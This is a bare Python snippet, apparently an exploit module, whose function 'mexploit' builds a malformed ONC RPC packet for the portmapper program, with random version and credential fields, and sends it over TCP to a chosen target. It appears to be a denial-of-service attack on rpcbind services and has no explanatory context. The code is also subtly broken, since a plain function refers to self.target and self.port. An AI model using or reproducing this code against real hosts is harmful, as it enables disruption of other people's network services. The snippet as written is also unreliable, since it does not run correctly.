import socket
import random

from struct import pack

def mexploit(target, port):
   for i in range(1):
      pkt = pack(
         "!IIIIIIIIIII",
         0x80000030,  # fragment header
         random.randint(1, 2 ** 32 - 1),  # xid
         0,  # message type
         2,  # rpc version
         0x100000,  # program
         random.randint(1, 2 ** 32 - 1),  # program version
         0,  # procedure
         random.randint(1, 2 ** 32 - 1),  # credential flavor
         0,  # credential length
         0,  # verifier
         0,
      )
      try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(2)
         sock.connect((self.target, self.port))
         sock.send(pkt)
         sock.close()

      except Exception as err:
         return